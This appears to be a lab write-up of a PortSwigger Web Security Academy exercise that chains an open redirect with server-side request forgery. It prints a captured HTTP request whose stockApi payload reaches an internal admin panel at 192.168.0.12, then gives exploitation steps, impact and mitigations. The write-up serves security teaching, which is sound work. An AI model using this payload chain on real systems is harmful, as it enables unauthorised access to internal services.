# 📘 Scenario 5: SSRF Chained with Open Redirect

## 🔎 Vulnerability Description

In this scenario, the application has a basic SSRF prevention mechanism in place — it **only allows internal requests if the URL is from a trusted domain**. However, the application also suffers from an **open redirect vulnerability** that can be chained with SSRF to bypass this check.

By crafting a malicious URL that **redirects internally**, the attacker tricks the server into sending requests to **unauthorized internal resources**.

> **Vulnerability Type:** SSRF via Redirection  
> **Combined with:** Open Redirect  
> **OWASP Top 10 ID:** A10:2021 – SSRF  
> **Risk Level:** High (chainable exploit)

---

## 🔧 Target

**SSRF Endpoint:**

🔗 https://0a39009b0419957b806558b700f70007.web-security-academy.net/product/stock \
🔗 https://0a39009b0419957b806558b700f70007.web-security-academy.net/product/nextProduct?currentProductId=1&path=[payload]

---
## 🧠 Exploitation Logic

1. SSRF filter allows requests only to trusted domain: `web-security-academy.net`.
2. Open redirect vulnerability lets attacker redirect from `web-security-academy.net` to an **internal host**.
3. Chain both to access internal resource indirectly.

---

## 📥 HTTP Request

```http
POST /product/stock HTTP/2
Host: 0a39009b0419957b806558b700f70007.web-security-academy.net
Cookie: session=yVrzyNrEbsIirT0y0xGvL2u6X8R0nwjM
Content-Length: 86
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a39009b0419957b806558b700f70007.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a39009b0419957b806558b700f70007.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
 
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin

```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3177

```
---

## 🧪 Exploitation Steps

Confirm that `stockApi=http://192.168.0.12/` is blocked.

Test the redirect endpoint:

``` 
https://0a39009b0419957b806558b700f70007.web-security-academy.net/product/nextProduct?currentProductId=1&path=http://192.168.0.12/admin 
```
Use that redirect URL as input to `stockApi` parameter.

Send the full chained request and observe the server’s response.

## 💥 Potential Impact

- **Bypasses SSRF protections** based on trusted hostname checks.

- Access to **internal admin panels**, cloud metadata, or service dashboards.

- May lead to **privilege escalation**, **sensitive data leakage**, or **RCE** in chained attacks.

- **Precursor to RCE or lateral movement**.

## ✅ Mitigation Suggestions
- Disallow redirects to non-whitelisted domains or IPs.

- Prevent open redirects altogether by validating `path` parameters strictly.

- Resolve final redirect destination before sending any request.

- Use SSRF-aware request wrappers that don't follow redirects by default.

## 📸 Screenshot

![Exploitation Image Of Scenario 5.1](https://github.com/hovikhanh/ssrf-demo/blob/main/images/Picture5.1.png "Exploitation Image Of Scenario 5.1")

![Exploitation Image Of Scenario 5.2](https://github.com/hovikhanh/ssrf-demo/blob/main/images/Picture5.2.png "Exploitation Image Of Scenario 5.2")

## 🔗 References

[PortSwigger – SSRF via Open Redirect](https://portswigger.net/web-security/ssrf)

[OWASP Open Redirect Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Open_Redirect_Prevention_Cheat_Sheet.html)

> ⚠️ This is a chained attack that requires exploiting two flaws. It demonstrates why single-point protections (like hostname checks) are insufficient in real-world web applications.